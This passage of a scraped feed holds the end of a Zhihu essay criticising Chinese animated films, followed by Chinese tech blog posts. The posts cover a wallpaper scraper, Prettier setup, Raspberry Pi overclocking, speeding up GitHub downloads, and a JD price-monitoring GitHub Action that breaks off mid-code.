data-private-watermark-src=\"v2-e02fcee82f89bec1ce548a3344d940b8\"></p>\n<p>必然会有反对的声音说，这些国产动画电影的票房数字可观，对它们的受众群体大小、剧本和制作水平以及意识形态内容的反思都不成立，毕竟人民群众用电影票说话了——从票房数字的美梦中醒来吧！《白蛇2：青蛇劫起》救市成功了吗？在《哪吒之魔童降世》成功后被寄予了过高票房期望的国产动画电影，这两年间有哪一部真正达到口碑和票房的预期了呢？</p>\n<p>六年来观众用爱发电，每次都以拯救中国动画产业的牺牲心态购票入场，面对这些六年来没有什么长进，还在选题和创意上越发枯竭和套路化的作品，用如此的宽容所塑造的票房美梦还能坚持多久呢？距离破灭的日子已经不远了，也许在我们看不到的暗影中，在各大动画制片方还在紧锣密鼓地推出各种片单计划的背后，无论是观众还是投资方，都在默默寻找下一个淘金新风口——“国潮”“古风”依然坚挺，谁都还要吃这碗饭，但谁也没有说一定要在国产动画电影这个被定了型的缝合怪上吊死：其他的选择必然是有的。</p>\n<p>写作这篇反思录时，我与一名在国产动画电影行业里摸爬滚打多年的老同学做了交流，我询问我的部分想法是不是过分激烈、偏颇了一些，结果她说，“你这么温和是转性了吗？我们内部开会时说得比这狠多了”。她的这句话，可能是我对国产动画电影还抱有最后期望的原因；至少这些显而易见的问题，业界并不是熟视无睹的，之所以长久以来没有被解决，当然不会全是创作者的责任。那么，就一起把这些问题告诉资本方吧：六年来国产动画电影的崛起与“盛世”之下，可能需要一些看向未来的危言。</p>\n<p>注：文中引用大陆电影市场票房数据来自“猫眼专业版”app；海外电影票房数据来自美国专业网站Box Office Mojo。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-e460fa339f4bc667a9fba12d8fb7b7b3_720w.jpg?rss\" data-caption=\"在日本等海外市场取得一定成功的《罗小黑战记》。图片：豆瓣电影\" data-size=\"normal\" data-rawwidth=\"800\" data-rawheight=\"190\" data-watermark=\"original\" data-original-src=\"v2-e460fa339f4bc667a9fba12d8fb7b7b3\" data-watermark-src=\"v2-9b1d80b4a680ffd7babd9f705516093d\" data-private-watermark-src=\"v2-32a4280d73749de7387394d5066f861c\"></p>\n<p><br></p>\n<a href=\"http://link.zhihu.com/?target=https%3A//www.allnow.com/post/61231d0cfbcfb8144541fdaf%3Fplatform%3Dzh\" data-draft-node=\"block\" data-draft-type=\"link-card\" data-image=\"https://pic3.zhimg.com/v2-9b776f0f147c66a018f49aa7dc1174e6_bh.jpg\" data-image-width=\"220\" data-image-height=\"100\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">高调崛起之后的暗影危机--国产动画电影六年反思录-全现在官方网站</a><p><br>关注<b><a href=\"https://www.zhihu.com/column/c_1374438877965520897\" class=\"internal\">次元研究专栏</a></b>，汇聚跨次元的浅趣深知。</p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/ci-yuan-yan-jiu?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">次元研究</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/21831384/answer/2081202766?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">80 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/21760112?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">如何评论中国动画？</a><br><a href=\"http://www.zhihu.com/question/410430997?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">为什么不能吹国产动画崛起？</a><br>\n","link":"http://www.zhihu.com/question/21831384/answer/2081202766?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"使用 Python 爬取故宫壁纸","date":"2021-07-17 05:55:00","description":"\n<p>我非常喜欢故宫壁纸，但是一张一张下载的速度就太慢了。</p>\n<p>于是，我就写了个简单的 Python 小程序自动爬取故宫壁纸。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E4%BB%A3%E7%A0%81\" class=\"headerlink\" title=\"代码\"></a>代码</h2>\n<p>首先，我们通过简单的查看，知道故宫壁纸的页面并没有使用 JavaScript 载入。</p>\n<p>但是故宫壁纸很多，所以还需要分类。</p>\n<p>故宫壁纸大多都是以分类开头，如 <code>爱上紫禁城 紫藤</code>, <code>清   虚谷紫藤金鱼图轴（局部）</code> 等等，所以一般只需要做个简单的 <code>startswith()</code> 判断就 OK 了。</p>\n<p>很多壁纸的标题都是一样的，所以还可以使用 <code>random</code> 库在文件名末尾追加一个随机数。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests, bs4, time, random</span><br><span class=\"line\">path = <span class=\"string\">\"./wallpaper/爱上紫禁城\"</span></span><br><span class=\"line\"></span><br><span class=\"line\">catch = <span class=\"number\">0</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>, <span class=\"number\">119</span>):</span><br><span class=\"line\">    <span class=\"comment\"># 组合请求 URL</span></span><br><span class=\"line\">    url = <span class=\"string\">\"https://www.dpm.org.cn/lights/royal/p/{}.html\"</span>.<span class=\"built_in\">format</span>(i)</span><br><span class=\"line\">    <span class=\"comment\"># 发送请求</span></span><br><span class=\"line\">    response = requests.get(url)</span><br><span class=\"line\">    <span class=\"comment\"># 设定页面编码为 UTF-8</span></span><br><span class=\"line\">    response.encoding = <span class=\"string\">\"UTF-8\"</span></span><br><span class=\"line\">    <span class=\"comment\"># 从 HTML 中解析数据</span></span><br><span class=\"line\">    soup = bs4.BeautifulSoup(response.text, <span class=\"string\">\"lxml\"</span>)</span><br><span class=\"line\">    image = soup.find_all(name=<span class=\"string\">\"div\"</span>, class_=<span class=\"string\">\"pic\"</span>)</span><br><span class=\"line\">    <span class=\"comment\"># 循环输出图片</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> n <span class=\"keyword\">in</span> image:</span><br><span class=\"line\">        catch = catch + <span class=\"number\">1</span></span><br><span class=\"line\">        <span class=\"comment\"># 获得壁纸名称</span></span><br><span class=\"line\">        <span class=\"comment\"># 分类，不是以【爱上紫禁城】开头的壁纸都忽略</span></span><br><span class=\"line\">        img_name = n.a.img[<span class=\"string\">\"title\"</span>]</span><br><span class=\"line\">        <span class=\"keyword\">if</span> img_name.startswith(<span class=\"string\">\"明\"</span>):</span><br><span class=\"line\">            print(<span class=\"string\">\"{}. {}\"</span>.<span class=\"built_in\">format</span>(catch, n.a.img[<span class=\"string\">\"title\"</span>]))</span><br><span class=\"line\">            <span class=\"comment\"># 组合获得壁纸页面</span></span><br><span class=\"line\">            url_1080 = <span class=\"string\">\"https://www.dpm.org.cn\"</span> + n.a[<span class=\"string\">\"href\"</span>]</span><br><span class=\"line\">            <span class=\"comment\"># 请求高清版网页</span></span><br><span class=\"line\">            response_img = requests.get(url_1080)</span><br><span class=\"line\">            <span class=\"comment\"># 再次解析</span></span><br><span class=\"line\">            soup_img = bs4.BeautifulSoup(response_img.text, <span class=\"string\">\"lxml\"</span>)</span><br><span class=\"line\">            <span class=\"comment\"># 获取页面中的图片</span></span><br><span class=\"line\">            data = soup_img.find_all(name=<span class=\"string\">\"img\"</span>)[<span class=\"number\">0</span>]</span><br><span class=\"line\">            <span class=\"comment\"># 获得壁纸图片的链接</span></span><br><span class=\"line\">            img_url = data[<span class=\"string\">\"src\"</span>]</span><br><span class=\"line\">            <span class=\"comment\"># 保存图片</span></span><br><span class=\"line\">            pic = requests.get(img_url).content</span><br><span class=\"line\">            file_name = path + img_name + <span class=\"string\">\"-\"</span> + <span class=\"built_in\">str</span>(random.randint(<span class=\"number\">100000</span>, <span class=\"number\">999999</span>)) + <span class=\"string\">\".jpg\"</span></span><br><span class=\"line\">            <span class=\"comment\"># 写入文件</span></span><br><span class=\"line\">            <span class=\"keyword\">with</span> <span class=\"built_in\">open</span>(file_name, <span class=\"string\">\"wb\"</span>) <span class=\"keyword\">as</span> file:</span><br><span class=\"line\">                file.write(pic)</span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            print(<span class=\"string\">\"!Ignore: \"</span> + img_name)</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E5%90%8E\" class=\"headerlink\" title=\"后\"></a>后</h2>\n<p>我把一些我下载下来的壁纸放在了 <a href=\"https://t.yfun.top/dpm-wallpaper\">这里</a>，可以直接预览并下载。</p>\n<p><del>OK，又水了一篇文（</del></p>\n","link":"https://blog.yfun.top/posts/2021/dpm-wallpaper/"},{"title":"使用 Prettier 格式化代码","date":"2021-07-15 06:45:00","description":"\n<p>格式化代码可以提高代码的可读性，使代码更加美观。</p>\n<p>Prettier 支持：</p>\n<ul>\n<li>JavaScript (including experimental features)</li>\n<li>JSX</li>\n<li>Angular</li>\n<li>Vue</li>\n<li>Flow</li>\n<li>TypeScript</li>\n<li>CSS, Less, and SCSS</li>\n<li>HTML</li>\n<li>JSON</li>\n<li>GraphQL</li>\n<li>Markdown, including GFM and MDX</li>\n<li>YAML</li>\n</ul>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%AE%89%E8%A3%85\" class=\"headerlink\" title=\"安装\"></a>安装</h2>\n<h3>\n<a href=\"https://blog.yfun.top/#%E6%8F%92%E4%BB%B6\" class=\"headerlink\" title=\"插件\"></a>插件</h3>\n<p>你可以很方便的在 VSCode 等 IDE 上安装插件，插件名为 <code>Prettier</code>.</p>\n<p>以 VSCode 为例：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.10/rawimg/6a3ad0ea42d55.png\"></p>\n<blockquote><p>如果安装了其他格式化插件，则需要点击 [格式化文档的方式]，选择 <code>Prettier</code>。</p></blockquote>\n<h3>\n<a href=\"https://blog.yfun.top/#CLI\" class=\"headerlink\" title=\"CLI\"></a>CLI</h3>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo npm i -g prettier</span><br></pre></td></tr></table></figure><p>相关的文档可参见官网: <a href=\"https://prettier.io/docs/en/cli.html\">https://prettier.io/docs/en/cli.html</a></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">prettier --write . <span class=\"comment\"># 格式化当前文件夹的所有文件</span></span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E9%85%8D%E7%BD%AE\" class=\"headerlink\" title=\"配置\"></a>配置</h2>\n<p>参见官方文档：</p>\n<ul>\n<li><p><a href=\"https://prettier.io/docs/en/configuration.html\">https://prettier.io/docs/en/configuration.html</a></p></li>\n<li><p><a href=\"https://prettier.io/docs/en/options.html\">https://prettier.io/docs/en/options.html</a></p></li>\n</ul>\n<p>Prettier 的配置文件有多种写法：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.10/rawimg/a4cc583d84c12.png\"></p>\n<p>以使用 <code>YAML</code> 书写的 <code>.prettierrc</code> 为例：</p>\n<figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 单行最长字符数</span></span><br><span class=\"line\"><span class=\"attr\">printWidth:</span> <span class=\"number\">80</span></span><br><span class=\"line\"><span class=\"comment\"># 制表符长度</span></span><br><span class=\"line\"><span class=\"attr\">tabWidth:</span> <span class=\"number\">4</span></span><br><span class=\"line\"><span class=\"comment\"># 是否使用 Tab</span></span><br><span class=\"line\"><span class=\"attr\">useTabs:</span> <span class=\"literal\">false</span></span><br><span class=\"line\"><span class=\"comment\"># 是否加入分号</span></span><br><span class=\"line\"><span class=\"attr\">semi:</span> <span class=\"literal\">true</span></span><br><span class=\"line\"><span class=\"comment\"># 单引号</span></span><br><span class=\"line\"><span class=\"attr\">singleQuote:</span> <span class=\"literal\">false</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># ...</span></span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E6%95%88%E6%9E%9C\" class=\"headerlink\" title=\"效果\"></a>效果</h2>\n<p>格式化前：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\">fetch(<span class=\"string\">\"https://blog.yfun.top/search.json\"</span>).then(<span class=\"function\"><span class=\"params\">res</span>=&gt;</span>res.json()).then(<span class=\"function\">(<span class=\"params\">content</span>) =&gt;</span> {<span class=\"built_in\">console</span>.log(content);<span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> i = <span class=\"number\">0</span>; i &lt; content.length; i++){<span class=\"built_in\">console</span>.log(content[i][<span class=\"string\">'title'</span>] + <span class=\"string\">\" --- https://blog.yfun.top\"</span> + content[i][<span class=\"string\">'url'</span>])}})</span><br></pre></td></tr></table></figure><p>格式化后：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\">fetch(<span class=\"string\">\"https://blog.yfun.top/search.json\"</span>)</span><br><span class=\"line\">    .then(<span class=\"function\">(<span class=\"params\">res</span>) =&gt;</span> res.json())</span><br><span class=\"line\">    .then(<span class=\"function\">(<span class=\"params\">content</span>) =&gt;</span> {</span><br><span class=\"line\">        <span class=\"built_in\">console</span>.log(content);</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> i = <span class=\"number\">0</span>; i &lt; content.length; i++) {</span><br><span class=\"line\">            <span class=\"built_in\">console</span>.log(</span><br><span class=\"line\">                content[i][<span class=\"string\">\"title\"</span>] +</span><br><span class=\"line\">                    <span class=\"string\">\" --- https://blog.yfun.top\"</span> +</span><br><span class=\"line\">                    content[i][<span class=\"string\">\"url\"</span>]</span><br><span class=\"line\">            );</span><br><span class=\"line\">        }</span><br><span class=\"line\">    });</span><br></pre></td></tr></table></figure>\n","link":"https://blog.yfun.top/posts/2021/format-code-using-prettier/"},{"title":"树莓派超频","date":"2021-06-25 07:50:00","description":"\n<div class=\"note note-info\">            <p>本文操作系统为 Ubuntu Server 20.04，其他操作系统可能有所不同。</p>          </div>\n<div class=\"note note-warning\">            <p>超频是有风险的，温度也会更高，需要比较良好的散热。</p>          </div>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%BC%80%E5%A7%8B\" class=\"headerlink\" title=\"开始\"></a>开始</h2>\n<p>登录树莓派，进入 <code>/boot/firmware/</code> 目录：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">cd</span> /boot/firmware/</span><br></pre></td></tr></table></figure><div class=\"note note-warning\">            <p>网上很多教程让你修改 <code>config.txt</code> 文件，但注释里已经很明确的写了：</p>\n<figure class=\"highlight text\"><table><tr><td class=\"code\"><pre><span class=\"line\"># Please DO NOT modify this file; if you need to modify the boot config, the</span><br><span class=\"line\"># \"usercfg.txt\" file is the place to include user changes. Please refer to</span><br><span class=\"line\"># the README file for a description of the various configuration files on</span><br><span class=\"line\"># the boot partition.</span><br></pre></td></tr></table></figure>\n</div>\n<p>我们修改 <code>usercfg.txt</code> 文件：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo vim usercfg.txt</span><br></pre></td></tr></table></figure><p>在文件末尾追加配置信息，以下是我的，仅供参考：</p>\n<div class=\"note note-danger\">            <p>我使用的是 <code>Raspberry Pi 4 (4GB)</code>，并且有小风扇和散热片。<br>请根据自己的需要和配置进行更改。</p>          </div>\n<figure class=\"highlight text\"><table><tr><td class=\"code\"><pre><span class=\"line\">force_turbo=0</span><br><span class=\"line\">arm_freq=1850</span><br><span class=\"line\">over_voltage=6</span><br><span class=\"line\">gpu_freq=650</span><br><span class=\"line\">core_freq=650</span><br><span class=\"line\">gpu_mem=620</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E9%87%8D%E5%90%AF\" class=\"headerlink\" title=\"重启\"></a>重启</h2>\n<p>保存文件，使用命令重启：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo reboot</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E5%90%8E\" class=\"headerlink\" title=\"后\"></a>后</h2>\n<p>重启完毕后，再使用 <code>lscpu</code> 命令看看 CPU 状况。</p>\n","link":"https://blog.yfun.top/posts/1445549919/"},{"title":"加速 GitHub 下载","date":"2021-06-18 09:30:00","description":"\n<p>GitHub 在国内的访问情况不太稳定，仓库克隆速度也非常慢。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E2%9C%88%EF%B8%8F\" class=\"headerlink\" title=\"✈️\"></a>✈️</h2>\n<p>不必多说。</p>\n<p>例如 <a href=\"http://127.0.0.1:7890/\">http://127.0.0.1:7890</a> 为代理地址，你可以使用下方的命令更改：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">git config --global http.proxy http://127.0.0.1:7890</span><br></pre></td></tr></table></figure><p>如果有一天不需要了，输入下面代码取消：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">git config --global --<span class=\"built_in\">unset</span> http.proxy</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#FastGit\" class=\"headerlink\" title=\"FastGit\"></a>FastGit</h2>\n<p>使用 <a href=\"https://fastgit.org/\">FastGit</a> 提供的 GitHub 镜像。</p>\n<p>镜像地址：<a href=\"https://hub.fastgit.org/\">https://hub.fastgit.org</a></p>\n<p>支持 HTTPS 克隆，并且提供 raw.githubusercontent.com 的镜像，地址为 <a href=\"https://raw.fastgit.org/\">https://raw.fastgit.org</a></p>\n<h2>\n<a href=\"https://blog.yfun.top/#CNPM\" class=\"headerlink\" title=\"CNPM\"></a>CNPM</h2>\n<p>使用 <a href=\"https://cnpmjs.org/\">CNPM</a> 提供的 GitHub 镜像。</p>\n<p>镜像地址：<a href=\"https://github.com.cnpmjs.org/\">https://github.com.cnpmjs.org</a></p>\n<p>支持 HTTPS 克隆。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#Hosts\" class=\"headerlink\" title=\"Hosts\"></a>Hosts</h2>\n<p>通过更改 Hosts 文件的方式解决，但大有可能失效：</p>\n<figure class=\"highlight text\"><table><tr><td class=\"code\"><pre><span class=\"line\">199.232.69.194  github.global.ssl.fastly.net</span><br><span class=\"line\">140.82.113.4    github.com</span><br></pre></td></tr></table></figure><p>GitHub 上的 <a href=\"https://github.com/521xueweihan/GitHub520\">521xueweihan/GitHub520</a> 项目提供了更多关于 GitHub Hosts 列表。</p>\n<blockquote><p><a href=\"https://github.com/521xueweihan/GitHub520/issues/53\">521xueweihan/GitHub520 #53</a></p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#Gitee\" class=\"headerlink\" title=\"Gitee\"></a>Gitee</h2>\n<p>网上挺多教程，使用 Gitee 的「从 GitHub 导入」功能。</p>\n<p>不过 Gitee 限制仓库 500MB。。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#Coding\" class=\"headerlink\" title=\"Coding\"></a>Coding</h2>\n<p>进入 Coding 控制台，点击「创建项目」。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/k7uHJm.png\"></p>\n<p>项目模版选择「代码托管」就好，仅做下载的话无需开启太多。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/bEO0vX.png\"></p>\n<p>填写项目基本信息，如名称、标识等。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/N4xjSv.png\"></p>\n<p>新建一个镜像仓库。</p>\n<p>「Git 仓库 URL」填写 GitHub 公开仓库 HTTPS 克隆地址，如：<a href=\"https://github.com/twbs/bootstrap.git\">https://github.com/twbs/bootstrap.git</a></p>\n<p>创建完成后请稍等，系统就会自动导入。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/YxnnDj.png\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/FmfWkf.png\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/OV7w4v.png\"></p>\n<p>导入完成后，点击「克隆」就能找到克隆地址。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/bWszbu.png\"></p>\n<p>克隆速度挺快的：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">Cloning into <span class=\"string\">'bootstrap'</span>...</span><br><span class=\"line\">remote: Enumerating objects: 169214, <span class=\"keyword\">done</span>.</span><br><span class=\"line\">remote: Counting objects: 100% (169214/169214), <span class=\"keyword\">done</span>.</span><br><span class=\"line\">remote: Compressing objects: 100% (51634/51634), <span class=\"keyword\">done</span>.</span><br><span class=\"line\">Receiving objects:  57% (96728/169214), 90.58 MiB | 6.83 MiB/s </span><br></pre></td></tr></table></figure><p>此外，Coding 还支持自动同步，可以设置每天的同步时间。</p>\n","link":"https://blog.yfun.top/posts/2517388641/"},{"title":"GitHub Action 监测京东商品价格","date":"2021-05-18 10:32:00","description":"\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%89%8D%E8%A8%80\" class=\"headerlink\" title=\"前言\"></a>前言</h2>\n<p>我会在京东上买些电子产品和文具，那么如何获得商品降价信息，使用更低的价格购买呢？</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%BC%80%E5%A7%8B\" class=\"headerlink\" title=\"开始\"></a>开始</h2>\n<p>新建一个 <code>GitHub</code> 仓库，创建 <code>main.py</code> , <code>notify.py</code> 和 <code>.github/workflows/auto.yml</code> 三个文件，内容如下：</p>  <details class=\"post-details\"><summary><code>main.py</code> (点击展开)</summary><div class=\"details-content\">  <figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*-</span></span><br><span class=\"line\"><span class=\"comment\"># 导入模块</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> urllib.request, random, json, notify</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 商品列表</span></span><br><span class=\"line\">check = [</span><br><span class=\"line\">    <span class=\"comment\"># 闪迪（SanDisk）64GB TF（MicroSD）存储卡</span></span><br><span class=\"line\">    <span class=\"string\">'1887526'</span>,</span><br><span class=\"line\">    <span class=\"comment\"># 晨光(M&amp;G)文具 0.5mm 黑色中性笔</span></span><br><span class=\"line\">    <span class=\"string\">'277393'</span></span><br><span class=\"line\"><span class=\"comment\"># ...</span></span><br><span class=\"line\">]</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 价格列表，用于临时存储获取到的价格数据</span></span><br><span class=\"line\">price = {}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 读取上次的价格文件</span></span><br><span class=\"line\"><span class=\"keyword\">try</span>:</span><br><span class=\"line\">    file = <span class=\"built_in\">open</span>(<span class=\"string\">'./price.json'</span>, mode=<span class=\"string\">'r'</span>)</span><br><span class=\"line\">    lastPrice = json.loads(file.readlines()[<span class=\"number\">0</span>])</span><br><span class=\"line\"><span class=\"keyword\">except</span>:</span><br><span class=\"line\">    print(<span class=\"string\">\"读取文件时出现错误！\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 遍历列表，比对价格</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> itemId <span class=\"keyword\">in</span> check:</span><br><span class=\"line\">    <span class=\"comment\"># 组合请求 URL</span></span><br><span class=\"line\">    <span class=\"comment\"># http://p.3.cn/prices/mgets?skuIds=J_</span></span><br><span class=\"line\">    url = <span class=\"string\">'http://p.3.cn/prices/mgets?skuIds=J_{}'</span>.<span class=\"built_in\">format</span>(itemId)</span><br><span class=\"line\">    <span class=\"comment\"># User-Agent 列表</span></span><br><span class=\"line\">    ua = [<span class=\"string\">'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36'</span>,<span class=\"string\">'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36'</span>,<span class=\"string\">'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36 OPR/26.0.1656.60'</span>,<span class=\"string\">'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50'</span>,<span class=\"string\">'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50'</span>]</span><br><span class=\"line\">    <span class=\"comment\"># 随机获得一个 User-Agent，如不带 User-Agent 请求，就会被拒绝。</span></span><br><span class=\"line\">    headers = {</span><br><span class=\"line\">        <span class=\"string\">'User-Agent'</span>: ua[random.randint(<span class=\"number\">0</span>,<span class=\"number\">4</span>)]</span><br><span class=\"line\">    }</span><br><span class=\"line\">    <span class=\"comment\"># 组合请求参数</span></span><br><span class=\"line\">    request = urllib.request.Request(url = url, headers = headers)</span><br><span class=\"line\">    <span class=\"comment\"># 向京东发起请求</span></span><br><span class=\"line\">    response = urllib.request.urlopen(request)</span><br><span class=\"line\">    <span class=\"comment\"># 将获得的数据转为 JSON</span></span><br><span class=\"line\">    page_text = json.loads(response.read().decode(<span class=\"string\">'utf-8'</span>))</span><br><span class=\"line\">    thisPrice = <span class=\"built_in\">float</span>(page_text[<span class=\"number\">0</span>][<span class=\"string\">'p'</span>])</span><br><span class=\"line\">    <span class=\"comment\"># 将价格输入至价格变量</span></span><br><span class=\"line\">    price[itemId] = thisPrice</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># 尝试对比价格</span></span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        <span class=\"keyword\">if</span> thisPrice &gt; lastPrice[itemId]:</span><br><span class=\"line\">            print(<span class=\"string\">\"{0} 涨价\"</span>.<span class=\"built_in\">format</span>(itemId))</span><br><span class=\"line\"></span><br><span class=\"line\">            print(thisPrice - lastPrice[itemId])</span><br><span class=\"line\">            notify.notify(itemId, <span class=\"number\">0</span>, thisPrice - lastPrice[itemId], thisPrice)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">elif</span> thisPrice &lt; lastPrice[itemId]:</span><br><span class=\"line\">            print(<span class=\"string\">\"{0} 降价\"</span>.<span class=\"built_in\">format</span>(itemId))</span><br><span class=\"line\">            print(lastPrice[itemId] - thisPrice)</span><br><span class=\"line\">            notify.notify(itemId, <span class=\"number\">2</span>, lastPrice[itemId] - thisPrice, thisPrice)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">elif</span> lastPrice[itemId] == thisPrice:</span><br><span class=\"line\">            print(<span class=\"string\">\"{0} 价格不变\"</span>.<span class=\"built_in\">format</span>(itemId))</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            print(<span class=\"string\">\"{0} 未知错误\"</span>.<span class=\"built_in\">format</span>(itemId))</span><br><span class=\"line\">    <span class=\"keyword\">except</span>:</span><br><span class=\"line\">        print(<span class=\"string\">\"无法进行比对\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 将 JSON 转为 字符串</span></span><br><span class=\"line\">priceStr = json.dumps(price)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 写入价格文件，便于下次查询</span></span><br><span class=\"line\"><span class=\"keyword\">try</span>:</span><br><span class=\"line\">    file = <span class=\"built_in\">open</span>(<span class=\"string\">'./price.json'</span>, mode = <span class=\"string\">'w'</span>)</span><br><span class=\"line\">    file.write(priceStr)</span><br><span class=\"line\">    file.close()</span><br><span class=\"line\"><span class=\"keyword\">except</span>:</span><br><span class=\"line\">    print(<span class=\"string\">\"写入文件时出现错误\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">print(price)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n</div></details><details class=\"post-details\"><summary><code>notify.py</code> (点击展开)</summary><div class=\"details-content\">  <figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*-</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> urllib.request, json, urllib.parse, ssl</span><br><span class=\"line\">ssl._create_default_https_context = ssl._create_unverified_context</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">提醒的服务，支持 `wechat` 与 `qmsg`。</span></span><br><span class=\"line\"><span class=\"string\">需要在下方进行下一步的配置</span></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\">server = [<span class=\"string\">'qmsg'</span>]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">WeChat 采用的是 Server 酱 (https://sc.ftqq.com/3.version) 提供的服务</span></span><br><span class=\"line\"><span 